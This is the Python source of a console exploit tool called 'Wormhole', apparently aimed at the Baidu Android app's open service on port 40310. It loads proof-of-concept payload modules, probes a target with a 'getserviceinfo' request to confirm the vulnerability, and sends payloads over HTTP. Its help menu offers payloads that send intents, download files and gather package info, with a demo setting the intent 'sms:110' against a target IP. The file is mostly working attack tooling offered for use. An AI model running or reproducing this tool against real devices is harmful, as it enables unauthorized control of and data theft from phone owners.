#!/usr/bin/env python
#-*- coding:utf-8 -*-

'''
Wormhole Exploit tool
---------------------
For baidu app (port:40310)
Author: Medici.Yan
'''

import os
from thirdparty.cmd2.cmd2 import Cmd
from libs.ui import UI
from libs.core.config import (TARGET, PAYLOAD, PAYLOADS, paths, cache)
from libs.core.settings import (PROMPT, HEADERS)
import urllib2
import ntpath
import sys
import imp
import socket


try:
    import readline
    if "libedit" in readline.__doc__:
        readline.parse_and_bind("bind ^I rl_complete")
    else:
        readline.parse_and_bind("tab: complete")
except:
    pass


socket.setdefaulttimeout(20)

def initializePoc(folders=[]):
    pocNumber = 0
    if not os.path.isdir(paths.POC_PATH):
        os.makedirs(paths.POC_PATH)

    folders.append(paths.POC_PATH)
    for folder in folders:
        files = os.listdir(folder)
        for file_i in files:
            if file_i.endswith(".py") and "__init__" not in file_i:
                PAYLOADS.update({ntpath.splitext(file_i)[0]: os.path.join(folder, file_i)})


class BaseConsole(Cmd):
    ui = UI()
    def __init__(self):
        Cmd.__init__(self)
        initializePoc()
        self.prompt = PROMPT


    def default(self, line):
        '''
        @desc: 默认命令处理
        '''
        return False

    def loop(self):
        ''' console loop '''
        self.ui.clear().banner()
        try:

            self.cmdloop()
        except KeyboardInterrupt:
            self.ui.notify.error('User exit')
        self.ui.notify.info('Thanks for using :)')

    def sendpoc(self, payload):
        ''' send poc to target '''

        req = urllib2.Request('http://%s:%s/' % (TARGET.RHOST, TARGET.RPORT) + payload,data="sms_body=test", headers=HEADERS)
        try:
            res = urllib2.urlopen(req)
            return (True, res.read())
        except Exception, e:
            return (False, e)

    def load_module(self, modulename, source):
        if modulename in sys.modules:
            sys.modules.pop(modulename)
        mod = imp.load_source(modulename, source)
        return mod

    def check(self):
        self.ui.notify.info('Checking target is vulnerable..')
        _, res = self.sendpoc('getserviceinfo?mcmdf=inapp_&callback=t')
        if _ and 'packagename":"com.baidu.' in res:
            self.ui.notify.success('Target is vulnerable!')
            self.loop()
        else:
            self.ui.notify.error('Target is not vulnerable! (%s)' % res)

    def do_use(self, args):
        if PAYLOADS.has_key(args):
            self.load_module(args, PAYLOADS.get(args))
        else:
            self.ui.notify.error("Load payload %s error." % args)

    def complete_use(self, text, line, begidx, endidx):
        if text:
            return [i.lower() for i in PAYLOADS.keys() if i.lower().startswith(text.lower())]
        return [i.lower() for i in PAYLOADS.keys()]


    def do_search(self, args):
        if not args:
            return
        selist = []
        selist.extend(self.all_2_list(PAYLOADS.keys()))
        selist.extend(self.all_2_list(cache))
        selist = list(set(selist))
        res = [i for i in selist if args in i]
        for i in res:
            self.ui.hilight.hilight(i, args,self.ui.GREEN, self.ui.RED)

    def complete_search(self, text, line, begidx, endidx):
        selist = []
        selist.extend(self.all_2_list(PAYLOADS.keys()))
        selist.extend(self.all_2_list(cache))
        selist = list(set(selist))
        if text:
            return [i for i in selist if text in i]
        return [i for i in selist]
    def all_2_list(self, obj):
        res = []
        if hasattr(obj, '__iter__'):
            if isinstance(obj, list):
                for i in obj:
                    res.extend(self.all_2_list(i))
            elif isinstance(obj, dict):
                for i in obj.keys():
                    res.extend(self.all_2_list(i))
                    res.extend(self.all_2_list(obj.get(i)))
            else:
                pass
        else:
            res.append(obj)
        return res

    def do_set(self, arg):
        if arg.split()[0].upper() in PAYLOAD.poc.options.keys():
            if len(arg.split()) == 2:
                PAYLOAD.poc.options.update({arg.split()[0].upper(): ''.join(arg.split()[1:])})
        elif arg.split()[0].upper() in TARGET.keys():
            if len(arg.split()) == 2:
                TARGET.update({arg.split()[0].upper(): ''.join(arg.split()[1:])})
        else:
            Cmd.do_set(self, arg)

    def complete_set(self, text, line, begidx, endidx):
        if PAYLOAD:
            if len(line.split())>=2:
                if PAYLOAD.poc.options.has_key(line.split()[1]):
                    opt = (PAYLOAD.poc.options.get(line.split()[1]))
                    if hasattr(opt, '__iter__'):
                        cache[line.split()[1]]=[]
                        cache[line.split()[1]] = opt
                        return [i for i in cache.get(line.split()[1]) if i.startswith(text)]
                    elif cache.has_key(line.split()[1]):
                        return [i for i in cache.get(line.split()[1]) if i.startswith(text)]
                    else:
                        pass
            if text:
                return [i.upper() for i in PAYLOAD.poc.options.keys() + TARGET.keys() if i.upper().startswith(text.upper())]
            return [i.upper() for i in PAYLOAD.poc.options.keys() + TARGET.keys()]
        if text:
            return [i.upper() for i in TARGET.keys() if i.upper().startswith(text.upper())]
        return [i.upper() for i in TARGET.keys()]

    def do_show(self, arg):
        if arg == 'options':
            if PAYLOAD.has_key('poc'):

                opts = []
                for i in PAYLOAD.poc.options.keys():
                    val = PAYLOAD.poc.options.get(i)
                    if hasattr(val, '__iter__'):
                        val = "Not Set"
                    opts.append([i, val])

                self.ui.help(
                    title="Payload Options:",
                    options=
                        opts
                        # [[i,[[j,""] for j in PAYLOAD.poc.options.get(i)]] for i in PAYLOAD.poc.options.keys()]
                    )
            if TARGET:
                self.ui.help(
                    title="Target Options:",
                    options=
                        [[i,TARGET.get(i)] for i in TARGET.keys()]
                    )
                # print "======\nTarget:\n======"
                # for i in TARGET.keys():
                #     print u"{key} => {value}".format(key=i, value=TARGET.get(i))
        else:
            Cmd.do_show(self, arg)

    def complete_show(self, text, line, begidx, endidx):
        return [i for i in ["options"] if i.startswith(text)]

    def do_info(self, args):
        if PAYLOAD and PAYLOAD.has_key('poc'):
            self.ui.help(
                title="Payload Info",
                options=[[i,PAYLOAD.poc.info.get(i)] for i in PAYLOAD.poc.info.keys()],
            )
        else:
            self.ui.info("Please use payload first!")
        # for i in PAYLOAD.poc.info.keys():
        #     print u"{key}:\n{orz}\n{value}\n".format(key=i, orz='=' * len(i),value=PAYLOAD.poc.info.get(i))

    def do_exploit(self, args):
        if PAYLOAD and PAYLOAD.has_key('poc'):
            if PAYLOAD.poc.options:
                for i in PAYLOAD.poc.options.keys():
                    if not PAYLOAD.poc.options.get(i):
                        return
            payload = PAYLOAD.poc.payload.format(self=PAYLOAD.poc)
            PAYLOAD.poc.callback(self.sendpoc(payload))


    def do_clear(self, args):
        self.ui.clear()

    def do_help(self, args):
        self.ui.help('W0RM HELP MENU', [
            ['use',[
                ['[check]', 'Load check payload'],
                ['[sendintent]', 'Load sendintent payload'],
                ['[downloadfile]', 'Load downloadfile payload'],
                ['[getinfo]', 'Load getinfo module, not pro module'],
                ['[packageinfo]', 'Load the packageinfo payload'],
            ]],
            ['show options', 'Show the payload params'],
            ['info', 'Watch the payload info'],
            ['set', [
                ['[option] [value]','Set the option value'],
            ]],
            ['exploit', 'run the payload'],
            ['search', 'Search text from cache'],
            ['====','========='],
            ['clear', 'Clear screen'],
            ['help', 'Display help menu'],
            ['quit', 'Exit w0rmHole'],
            ['====','========='],
            ['Demo:',[
                ['0', 'python w0rm.py 192.168.1.100'],
                ['1', 'use sendintent'],
                ['2', 'show options'],
                ['3', 'set intent sms:110'],
                ['4', 'exploit'],
            ]],
        ])



